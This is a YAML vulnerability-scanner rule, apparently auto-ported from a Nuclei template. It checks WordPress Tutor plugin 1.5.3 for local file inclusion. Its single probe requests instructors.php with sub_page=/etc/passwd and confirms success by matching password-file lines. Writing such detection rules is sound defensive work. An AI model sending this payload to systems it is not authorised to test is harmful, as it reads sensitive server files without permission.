schema_version: 1
id: "cortex.community:wp-tutor-lfi"
rule_version: "1.0.0"
requires:
  engine_api: 1
  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
info:
  name: "WordPress tutor 1.5.3 - Local File Inclusion"
  description: "WordPress tutor.1.5.3 is vulnerable to local file inclusion. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
  references:
    - "https://www.exploit-db.com/exploits/48058"
  cwes: [22]
  tags: ["wordpress", "wp-plugin", "lfi", "edb", "vuln", "nuclei", "auto-ported", "signal"]
  remediation: "See the referenced advisory / template source for remediation."
finding:
  sink_type: "VULNERABLE_COMPONENT"
  impact: "INFORMATION_DISCLOSURE"
  severity: "High"
  root_cause: "nuclei-ported-signal"
execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
steps:
  - id: "probe0"
    request: { method: "GET", path: "/wp-content/plugins/tutor/views/pages/instructors.php?sub_page=/etc/passwd" }
proof:
  kind: "signal.v1"
  assertions:
    regex: { left: { ref: "steps.probe0.body" }, right: { value: "root:.*:0:0:" } }
